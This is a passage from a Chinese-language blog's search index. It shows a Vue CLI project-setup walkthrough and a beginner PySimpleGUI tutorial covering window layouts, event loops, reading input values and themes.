project1</span><br></pre></td></tr></table></figure>\n\n<p>注意项目名称必须是小写字母。</p>\n<p>创建项目过程中，按以下方式选择：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. Manually select features (自定义)-&gt; 回车后下一步</span><br><span class=\"line\">2. 选择功能模块（空格-选择/取消，回车-确认选择）</span><br><span class=\"line\">\t- Babel</span><br><span class=\"line\">\t- Progressive Web App (PWA) Support</span><br><span class=\"line\">\t- Router</span><br><span class=\"line\">\t- Vuex</span><br><span class=\"line\">3. Use history mode for router? (Y/n) y</span><br><span class=\"line\">4. In package.json 配置文件 回车下一步</span><br><span class=\"line\">5. Save this as a preset for future projects? (y/N) n</span><br></pre></td></tr></table></figure>\n\n<p>以上确认后，则会创建项目。等待一分钟左右，创建成功后，会高亮显示</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">cd oneguoweb</span><br><span class=\"line\">npm run serve</span><br></pre></td></tr></table></figure>\n\n<p>进入项目目录中，运行npm run serve则启动项目。项目启动成功后：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">&gt; </span><span class=\"language-bash\">onegouapp@0.1.0 serve</span></span><br><span class=\"line\"><span class=\"meta prompt_\">&gt; </span><span class=\"language-bash\">vue-cli-service serve</span></span><br><span class=\"line\"></span><br><span class=\"line\"> INFO  Starting development server...</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"> DONE  Compiled successfully in 25347ms                                                                                                                    14:43:46</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">  App running at:</span><br><span class=\"line\">  - Local:   http://localhost:8080/</span><br><span class=\"line\">  - Network: http://192.168.200.66:8080/</span><br><span class=\"line\"></span><br><span class=\"line\">  Note that the development build is not optimized.</span><br><span class=\"line\">  To create a production build, run npm run build.</span><br></pre></td></tr></table></figure>\n\n<p>DONE表示完成。Local是本地访问地址，Network是远程访问地址。</p>\n<h2 id=\"二、Vue-js的模块化\"><a href=\"#二、Vue-js的模块化\" class=\"headerlink\" title=\"二、Vue.js的模块化\"></a>二、Vue.js的模块化</h2><p>项目代码参考：<code>git@github.com:disenQF/OneGuoWeb.git</code></p>\n<p>在components下声明组件，如Swiper.vue</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;template&gt;</span><br><span class=\"line\">  &lt;button class=&quot;btn btn-primary&quot;&gt;我是组件按钮&lt;/button&gt;</span><br><span class=\"line\">&lt;/template&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">export default &#123;</span><br><span class=\"line\">  name: &quot;Swiper&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;style scoped&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/style&gt;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、Node-js部署Vue-js项目\"><a href=\"#三、Node-js部署Vue-js项目\" class=\"headerlink\" title=\"三、Node.js部署Vue.js项目\"></a>三、Node.js部署Vue.js项目</h2><h2 id=\"四、Nginx部署Django项目\"><a href=\"#四、Nginx部署Django项目\" class=\"headerlink\" title=\"四、Nginx部署Django项目\"></a>四、Nginx部署Django项目</h2>","categories":["python"],"tags":["python-web"]},{"title":"python图形界面开发","url":"/2022/08/17/python%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2%E5%BC%80%E5%8F%91/","content":"<h1 id=\"1第一个界面-py\"><a href=\"#1第一个界面-py\" class=\"headerlink\" title=\"1第一个界面.py\"></a>1第一个界面.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 1. 导入库</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 2. 定义布局，确定行数</span></span><br><span class=\"line\">layout=[</span><br><span class=\"line\">\t\t\t[sg.Text(<span class=\"string\">&#x27;请输入您的基本信息&#x27;</span>)],</span><br><span class=\"line\">\t\t\t[sg.Text(<span class=\"string\">&#x27;姓名&#x27;</span>),sg.InputText(<span class=\"string\">&#x27;xx&#x27;</span>,key=<span class=\"string\">&#x27;name&#x27;</span>)],</span><br><span class=\"line\">\t\t\t[sg.Text(<span class=\"string\">&#x27;性别&#x27;</span>),sg.InputText(<span class=\"string\">&#x27;xx&#x27;</span>)],</span><br><span class=\"line\">\t\t\t[sg.Text(<span class=\"string\">&#x27;国籍&#x27;</span>),sg.InputText(<span class=\"string\">&#x27;xx&#x27;</span>)],</span><br><span class=\"line\">\t\t\t[sg.Button(<span class=\"string\">&#x27;确定&#x27;</span>),sg.Button(<span class=\"string\">&#x27;取消&#x27;</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 3. 创建窗口</span></span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 4. 事件循环</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">\tevent,value=window.read() <span class=\"comment\"># 窗口的读取，有两个返回值（1.事件 2.值）</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> event==<span class=\"literal\">None</span>:  <span class=\"comment\"># 窗口关闭事件</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> event==<span class=\"string\">&#x27;确定&#x27;</span>:</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(value[<span class=\"string\">&#x27;name&#x27;</span>])</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(value[<span class=\"number\">0</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 5. 关闭窗口</span></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"2窗口读取返回值–事件-py\"><a href=\"#2窗口读取返回值–事件-py\" class=\"headerlink\" title=\"2窗口读取返回值–事件.py\"></a>2窗口读取返回值–事件.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 1. 窗口关闭事件</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">\t窗口关闭按钮是一个特殊的按钮，在界面的右上角X</span></span><br><span class=\"line\"><span class=\"string\">\t编写方法：</span></span><br><span class=\"line\"><span class=\"string\">\t\tif event==None:  # 窗口关闭事件</span></span><br><span class=\"line\"><span class=\"string\">\t\t\tbreak</span></span><br><span class=\"line\"><span class=\"string\">\t\tif event==sg.WIN_CLOSED:  #窗口关闭事件</span></span><br><span class=\"line\"><span class=\"string\">\t\t\tbreak</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">注意：定义窗口关闭事件是至关重要的，当你忘记定义窗口关闭事件，然后又点击了窗口右上角的X按钮，它会默默地消耗你100%的CPU</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 2. 按钮点击事件</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">\tif event==&#x27;确认&#x27;:  # 判断事件是否发生</span></span><br><span class=\"line\"><span class=\"string\">\t\tprint(&#x27;确认&#x27;)  # 事件发生时要处理执行的任务</span></span><br><span class=\"line\"><span class=\"string\">\t\tsg.Popup(&#x27;执行确认任务&#x27;)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">\tif event==&#x27;取消&#x27;:  # 判断事件是否发生</span></span><br><span class=\"line\"><span class=\"string\">\t\tprint(&#x27;取消&#x27;)  # 事件发生时要处理执行的任务</span></span><br><span class=\"line\"><span class=\"string\">\t\tsg.Popup(&#x27;执行取消任务&#x27;)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"># 3. 判断事件是否发生的几种方式</span></span><br><span class=\"line\"><span class=\"string\">\tif event==&#x27;Exit&#x27;:</span></span><br><span class=\"line\"><span class=\"string\">\t\tsg.Popup(&#x27;您点击了Exit&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">\t\tbreak</span></span><br><span class=\"line\"><span class=\"string\">\tif event in (&#x27;Exit&#x27;, None):</span></span><br><span class=\"line\"><span class=\"string\">\t\tsg.Popup(&#x27;您点击了Exit或窗口关闭按钮&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">\t\tbreak</span></span><br><span class=\"line\"><span class=\"string\">\tif event.startswith(&#x27;确认&#x27;):</span></span><br><span class=\"line\"><span class=\"string\">\t\tsg.Popup(&#x27;您点击了Exit**的按钮&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">\t\tbreak</span></span><br><span class=\"line\"><span class=\"string\">\tif event.endswith(&#x27;确认&#x27;):</span></span><br><span class=\"line\"><span class=\"string\">\t\tsg.Popup(&#x27;您点击了**Exit的按钮&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">\t\tbreak</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"># 4. 其他元素事件</span></span><br><span class=\"line\"><span class=\"string\">\t像文本元素，输入框，下拉菜单等事件属性默认是关闭的。当手动设置他们的事件属性enable_events=True为真时，他们也将具有事件属性。</span></span><br><span class=\"line\"><span class=\"string\">\t以文本元素举例</span></span><br><span class=\"line\"><span class=\"string\">\tlayout=[[sg.Text(&#x27;OK&#x27;,enable_events=True)]]</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">\t...</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">\tif event==&#x27;OK&#x27;:</span></span><br><span class=\"line\"><span class=\"string\">\t\tsg.Popup(&#x27;文本元素OK的事件属性为真&#x27;)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1. 导入库</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 2. 定义布局，确定行数</span></span><br><span class=\"line\">layout=[</span><br><span class=\"line\">\t\t\t[sg.Text(<span class=\"string\">&#x27;请输入您的基本信息&#x27;</span>)],</span><br><span class=\"line\">\t\t\t[sg.Text(<span class=\"string\">&#x27;姓名&#x27;</span>,enable_events=<span class=\"literal\">True</span>),sg.InputText(<span class=\"string\">&#x27;xx&#x27;</span>)],</span><br><span class=\"line\">\t\t\t[sg.Text(<span class=\"string\">&#x27;性别&#x27;</span>),sg.InputText(<span class=\"string\">&#x27;xx&#x27;</span>)],</span><br><span class=\"line\">\t\t\t[sg.Text(<span class=\"string\">&#x27;国籍&#x27;</span>),sg.InputText(<span class=\"string\">&#x27;xx&#x27;</span>)],</span><br><span class=\"line\">\t\t\t[sg.Button(<span class=\"string\">&#x27;确认&#x27;</span>),sg.Button(<span class=\"string\">&#x27;取消&#x27;</span>)],</span><br><span class=\"line\">\t\t\t[sg.Button(<span class=\"string\">&#x27;确认1&#x27;</span>),sg.Button(<span class=\"string\">&#x27;1取消&#x27;</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 3. 创建窗口</span></span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 4. 事件循环</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">\tevent,value=window.read() <span class=\"comment\"># 窗口的读取，有两个返回值（1.事件 2.值）</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> event==<span class=\"literal\">None</span>:  <span class=\"comment\"># 窗口关闭事件</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">\tif event in (&#x27;确认&#x27;,&#x27;取消&#x27;):</span></span><br><span class=\"line\"><span class=\"string\">\t\tsg.Popup(&#x27;执行了确认或取消任务&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">\t&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> event.startswith(<span class=\"string\">&#x27;确认&#x27;</span>):</span><br><span class=\"line\">\t\tsg.Popup(<span class=\"string\">&#x27;执行确认&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> event.endswith(<span class=\"string\">&#x27;取消&#x27;</span>):</span><br><span class=\"line\">\t\tsg.Popup(<span class=\"string\">&#x27;执行取消&#x27;</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;姓名&#x27;</span>:</span><br><span class=\"line\">\t\tsg.Popup(<span class=\"string\">&#x27;这是个文本，点了也没用&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">\tif event == &#x27;确认&#x27;:</span></span><br><span class=\"line\"><span class=\"string\">\t\tsg.Popup(&#x27;执行了确认任务&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">\tif event == &#x27;取消&#x27;:</span></span><br><span class=\"line\"><span class=\"string\">\t\tsg.Popup(&#x27;执行了取消任务&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">\t&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 5. 关闭窗口</span></span><br><span class=\"line\">window.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"3窗口读取返回值–值-py\"><a href=\"#3窗口读取返回值–值-py\" class=\"headerlink\" title=\"3窗口读取返回值–值.py\"></a>3窗口读取返回值–值.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">本节课的本目标有两个：</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">一、通过列表索引获取返回值-值</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">list=[1,2,3,4,5]</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">print(list)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">输出结果为：[1, 2, 3, 4, 5]</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">print(list[0])</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">输出结果为：1</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">以上是我们之前学基础语法时，列表的一些知识点，我不多讲，哪么如何通过列有索引来获取窗口的返回值呢？</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">方法一：获取界面全部的值 print(values)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">方法二：获取界面指定的值 print(values[0]) ,print(values[1])</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">二、通过字典的键获取返回值-值</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">界面默认的返回值是通过列表索引获得指定值</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">但是当给元素设定唯一标识符key</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">则该元素无法通过列表索引</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">只能通过字典key进行索引。</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">print(values[key])</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">课程内演示所用代码如下：</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg</span><br><span class=\"line\"></span><br><span class=\"line\">layout=[</span><br><span class=\"line\">[sg.Text(<span class=\"string\">&#x27;请输入您的信息&#x27;</span>)],</span><br><span class=\"line\">[sg.Text(<span class=\"string\">&#x27;姓名&#x27;</span>),sg.InputText(<span class=\"string\">&#x27;程序员无声&#x27;</span>,key=<span class=\"string\">&#x27;name&#x27;</span>)],</span><br><span class=\"line\">[sg.Text(<span class=\"string\">&#x27;性别&#x27;</span>),sg.InputText(<span class=\"string\">&#x27;男&#x27;</span>)],</span><br><span class=\"line\">[sg.Text(<span class=\"string\">&#x27;民族&#x27;</span>),sg.InputText(<span class=\"string\">&#x27;汉&#x27;</span>)],</span><br><span class=\"line\">[sg.Button(<span class=\"string\">&#x27;确认&#x27;</span>),sg.Button(<span class=\"string\">&#x27;取消&#x27;</span>)]</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">window=sg.Window(<span class=\"string\">&#x27;Python教程&#x27;</span>,layout)</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\tevent,values=window.read()</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> event==<span class=\"literal\">None</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> event == <span class=\"string\">&#x27;确认&#x27;</span>:</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(values[<span class=\"string\">&#x27;name&#x27;</span>])</span><br><span class=\"line\">window.close() <span class=\"comment\"># 作者：程序员无声 https://www.bilibili.com/read/cv15481976 出处：bilibili</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"4PySimpleGUI如何设定主题-py\"><a href=\"#4PySimpleGUI如何设定主题-py\" class=\"headerlink\" title=\"4PySimpleGUI如何设定主题.py\"></a>4PySimpleGUI如何设定主题.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">主题theme包括：窗口的背景颜色，文本Text颜色，按钮的字体颜色和按钮颜色等。</span></span><br><span class=\"line\"><span class=\"string\">一、如何直观查看有效主题？</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">方法如下：</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">import PySimpleGUI as sg#导入库</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">sg.theme_previewer()#查看有效主题</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">二、如何获取有效主题？</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">import PySimpleGUI as sg#导入库</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">print(sg.theme_list()) #获取主题名称列表，并打印出来</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">三、如何设定主题</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">设定方法：</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">sg.theme(&#x27;主题名称&#x27;)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">如何随机主题：</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">sg.theme(&#x27;&#x27;) 作者：程序员无声 https://www.bilibili.com/read/cv15497613?spm_id_from=333.999.0.0 出处：bilibili</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg <span class=\"comment\">#导入库</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># sg.theme_previewer() #查看有效主题</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(sg.theme_list()) #获取主题名称列表，并打印出来</span></span><br><span class=\"line\"></span><br><span class=\"line\">sg.theme(<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">sg.Popup(<span class=\"string\">&#x27;演示弹窗&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"5如何修改主题-py\"><a href=\"#5如何修改主题-py\" class=\"headerlink\" title=\"5如何修改主题.py\"></a>5如何修改主题.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">如何获取主题的部份设置</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">获取方式：print(sg.theme_background_color())</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">常用到的一些主题属性：</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">theme_background_color                 #主题_背景_颜色</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">theme_border_width                         #主题_边框_宽度</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">theme_button_color                          #主题_按钮_颜色</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">theme_element_background_color  #主题_元素_背景_颜色</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">theme_element_text_color               #主题_元素_文本_颜色</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">theme_input_background_color       #主题_输入框_背景_颜色</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">theme_input_text_color                    #主题_输入框_文本_颜色</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">theme_progress_bar_border_color#主题_进度_栏_边框_颜色</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">theme_progress_bar_color              #主题_进度_栏_颜色</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">theme_slider_border_width             #主题_滑块_边框_颜色</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">theme_slider_color                          #主题_滑块_颜色</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">theme_text_color                             #主题_文本_颜色</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">theme_text_element_background_color#主题文本元素背景颜色</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">如何修改主题的部份设置</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">import PySimpleGUI as sg</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">print(sg.theme_list()) 作者：程序员无声 https://www.bilibili.com/read/cv15514934 出处：bilibili</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> PySimpleGUI <span class=\"keyword\">as</span> sg <span class=\"comment\">#导入库</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># sg.theme_previewer() #查看有效主题</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(sg.theme_list()) #获取主题名称列表，并打印出来</span></span><br><span class=\"line\"></span><br><span class=\"line\">sg.theme(<span class=\"string\">&#x27;DarkPurple&#x27;</span>)</span><br><span class=\"line\">sg.Popup(<span class=\"string\">&#x27;演示弹窗&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(sg.theme_background_color()</span></span><br><span class=\"line\">sg.theme_button_color((<span class=\"string\">&#x27;black&#x27;</span>,<span class=\"string\">&#x27;#472b62&#x27;</span>))</span><br><span class=\"line\">sg.Popup(<span class=\"string\">&#x27;演示弹窗&#x27;</span>,<span class=\"string\">&#x27;按键字体变黑色&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"6如何自定义窗口-py\"><a href=\"#6如何自定义窗口-py\" class=\"headerlink\" title=\"6如何自定义窗口.py\"></a>6如何自定义窗口.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">用for循环快速定义元素</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"># for循环遍历字符串                  # for循环遍历列表</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">a=&#x27;djfsdldkfj&#x27;                               a=[1,23,&#x27;A&#x27;,&#x27;程序员&#x27;]</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">for i in a:                                     for i in a:</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">   print(i)                                         print(i)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">以上是我们在学习基础语法时接触过for循环的一些使用方法，哪用它来定义元素要怎么做呢？</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">layout=[[sg.In(i) for i in &#x27;ABCD&#x27;]]    </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#用for循环遍历字符串的形式布局</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">layout=[[[sg.In(i)] for i in [&#x27;北京&#x27;,&#x27;上海&#x27;,&#x27;深圳&#x27;]]]</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#用for循环遍历列表的形式布局</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">布局和元素的另一种组合方式。</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">最常见的布局定义方式</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">layout=[</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">[sg.Text(&#x27;请输入基本信息&#x27;)]</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">[sg.Text(&#x27;姓名&#x27;),sg.In()],</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">[sg.Text(&#x27;性别&#x27;),sg.In()],</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">[sg.Text(&#x27;籍贯&#x27;),sg.In()],</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">[sg.B(&#x27;确认&#x27;),sg.B(&#x27;取消&#x27;)]</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">]</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">用+号拼接的方式：</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">layout=[</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">[sg.Text(&#x27;请输入基本信息&#x27;)],</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">[sg.Text(&#x27;姓名&#x27;)]+[sg.In()]]+[</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">[sg.Text(&#x27;性别&#x27;)]+[sg.In()]]+[</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">[sg.Text(&#x27;国籍&#x27;),sg.In()],</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">[sg.B(&#x27;确认&#x27;),sg.B(&#x27;取消&#x27;)]</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">]   